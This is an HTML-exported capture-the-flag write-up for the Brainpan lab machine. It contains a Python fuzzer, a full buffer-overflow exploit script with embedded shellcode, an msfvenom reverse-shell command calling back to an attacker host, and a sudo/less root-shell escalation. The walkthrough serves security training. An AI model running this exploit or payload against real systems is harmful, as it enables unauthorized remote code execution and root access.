<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>brainpan</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>brainpan</h1><br/><p><strong>Brainpan</strong></p><p></p><p>Nmap scan shows 2 open ports:</p><p></p><p>9999 :	Application access</p><p>10000	: Web server</p><p></p><p>Upon using gobuster on the web server, I found a hidden directory named <strong>bin</strong></p><p></p><p><img src="images/16-1.png" alt="images/16-1.png" /></p><p></p><p></p><p>We get the <strong>brainpan.exe</strong> inside the bin. We download it and run it on windows to reverse engineer it.</p><p></p><p></p><p>Default running of application asks for a password. If password is correct is access granted or if password is wrong it shows access denied.</p><p>Note: We do not need the correct password. Still following shows the way to find it from <strong>strings</strong>.</p><p></p><p></p><p><img src="images/16-2.png" alt="images/16-2.png" /></p><p></p><p><img src="images/16-3.png" alt="images/16-3.png" /></p><p></p><p>Select shitstorm and follow it.</p><p></p><p><img src="images/16-4.png" alt="images/16-4.png" /></p><p></p><p>We see the <strong>strcmp</strong>, indicating this is compared.</p><p>Thus we found password to be <strong>shitstorm</strong></p><p></p><p>Run the program with Immunity Debugger and find the offset using the following fuzzer + metasploit tool.</p><p></p><p>#!/usr/bin/env python3</p><p></p><p>import socket, time, sys</p><p></p><p>ip = &quot;11.11.11.123&quot;</p><p></p><p>port = 9999</p><p>timeout = 5</p><p></p><p>prefix = &quot;&quot;</p><p>string = prefix + &quot;A&quot; * 100</p><p></p><p>while True:</p><p>  try:</p><p>    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</p><p>      s.settimeout(timeout)</p><p>      s.connect((ip, port))</p><p>      s.recv(1024)</p><p>      print(&quot;Fuzzing Brainpan with {} bytes&quot;.format(len(string) - len(prefix)))</p><p>      s.send(bytes(string, &quot;latin-1&quot;))</p><p>      s.recv(1024)</p><p>  except:</p><p>    print(&quot;Fuzzing crashed at {} bytes&quot;.format(len(string) - len(prefix)))</p><p>    sys.exit(0)</p><p>  string += 100 * &quot;A&quot;</p><p>  time.sleep(1)</p><p></p><p>We find offset at : <strong>524</strong></p><p>Then we check for badchars.</p><p><img src="images/16-5.png" alt="images/16-5.png" /></p><p></p><p></p><p><img src="images/16-6.png" alt="images/16-6.png" /></p><p></p><p>Status is unmodified, thus stating we dont have any badchars.</p><p>Next I look for jump address. </p><p><img src="images/16-7.png" alt="images/16-7.png" /></p><p></p><p>The jump address is entered in retn variable.  Use the following exploit.</p><p>#!/usr/bin/env python3</p><p>#311712F3</p><p>#Badchars: \x00</p><p></p><p>import socket, time, sys</p><p></p><p>ip = &quot;10.10.89.221&quot;</p><p>port = 9999</p><p>timeout = 5</p><p></p><p>prefix = &quot;&quot;</p><p></p><p>offset = 524</p><p>overflow = &quot;A&quot; * offset</p><p>retn = &quot;\xf3\x12\x17\x31&quot;</p><p>padding = &quot;\x90&quot; * 10</p><p></p><p>payload = (&quot;\xdb\xc7\xba\x72\x1b\xf8\x45\xd9\x74\x24\xf4\x58\x29\xc9\xb1&quot;</p><p>&quot;\x12\x83\xe8\xfc\x31\x50\x13\x03\x22\x08\x1a\xb0\xf3\xf5\x2d&quot;</p><p>&quot;\xd8\xa0\x4a\x81\x75\x44\xc4\xc4\x3a\x2e\x1b\x86\xa8\xf7\x13&quot;</p><p>&quot;\xb8\x03\x87\x1d\xbe\x62\xef\x97\x4b\xdd\xf0\xcf\x49\xdd\x10&quot;</p><p>&quot;\x71\xc7\x3c\x9c\x17\x87\xef\x8f\x64\x24\x99\xce\x46\xab\xcb&quot;</p><p>&quot;\x78\x37\x83\x98\x10\xaf\xf4\x71\x82\x46\x82\x6d\x10\xca\x1d&quot;</p><p>&quot;\x90\x24\xe7\xd0\xd3&quot;)</p><p>postfix = &quot;&quot;</p><p></p><p></p><p></p><p>string = overflow + retn + padding + payload</p><p></p><p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p><p></p><p>try:</p><p>  s.connect((ip, port))</p><p>  print(&quot;Delivering Payload into Brainpan.&quot;)</p><p>  time.sleep(1)</p><p>  s.send(bytes(string + &quot;\r\n&quot;, &quot;latin-1&quot;))</p><p>  print(&quot;Done!&quot;)</p><p></p><p>except:</p><p>  print(&quot;Could not connect.&quot;)</p><p></p><p><strong>Note</strong>:</p><p>It is <strong>very important</strong> in machine at this point to change the payload.</p><p>Initially i tested with windows 10 and immunity debugger + mona</p><p>Once the exploit was successfully running in local setup. I decided to move it to server.</p><p>But the exploit will <strong>fail to work</strong></p><p></p><p>The reason is the target machine is running Linux and using wine to run the windows executible (Found out later)</p><p></p><p><em><strong>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.72.31 LPORT=7777 EXITFUNC=thread -b &quot;\x00&quot; -f c</strong></em></p><p>We use the above code in the payload</p><p></p><p>Run the above exploit on the machine after having a netcat listener.</p><p>We will get a shell with user <strong>puck</strong></p><p></p><p><img src="images/16-8.png" alt="images/16-8.png" /></p><p></p><p></p><p></p><p><strong>Privilege Escalation</strong></p><p></p><p>I loaded linpeas.sh (Download from github and host locally, then using wget download it in the target machine)</p><p>After running linpeas.sh</p><p></p><p>I found a sudo access to puck on a user application.</p><p></p><p><strong>Note:</strong> For the following privilege escalation to work, we need a stable shell. (Say python pty shell)</p><p>This is because, the <strong>sudo</strong> access runs <strong>man</strong> command in <strong>background</strong>.</p><p></p><p>By searching for sudo on man in GTFObins i found the following.</p><p></p><p><img src="images/16-9.png" alt="images/16-9.png" /></p><p></p><p></p><p>Now why a stable shell is necessary ?</p><p></p><p>if we run the program in normal shell. The output of <strong>man</strong> command is thrown on screen in one go.</p><p>However, for the above escalation to work, we need the <strong>man</strong> output in the “<strong>less</strong>” application</p><p>while running a python bash shell when i run the program using the proper argument. It will open the results in <strong>less</strong>.</p><p>There we can enter <strong>!/bin/sh</strong> to spawn a root shell.</p><p></p><p><img src="images/16-10.png" alt="images/16-10.png" /></p><p></p><p></p><p><img src="images/16-11.png" alt="images/16-11.png" /></p><p></p><p>We run <strong>sudo /home/anansi/bin/anansi_util manual man</strong></p><p></p><p></p><p><img src="images/16-12.png" alt="images/16-12.png" /></p><p></p><p>As the “<strong>Program Console</strong>” asks us to hit Enter. We type the  <strong>!/bin/sh</strong> and get a root shell.</p><p></p><p><img src="images/16-13.png" alt="images/16-13.png" /></p><p></p><p>Or</p><p></p><p>We can hit Enter in <strong>program console</strong> and go into the <strong>less</strong> display as shown below and type the <strong>!/bin/sh</strong> as shown to get root shell.</p><p></p><p><img src="images/16-14.png" alt="images/16-14.png" /></p><p></p><p>Upon hitting enter we get the root shell.</p><p></p><p><img src="images/16-15.png" alt="images/16-15.png" /></p><p></p><p>Thanks!!</p></div>
</body>
</html>
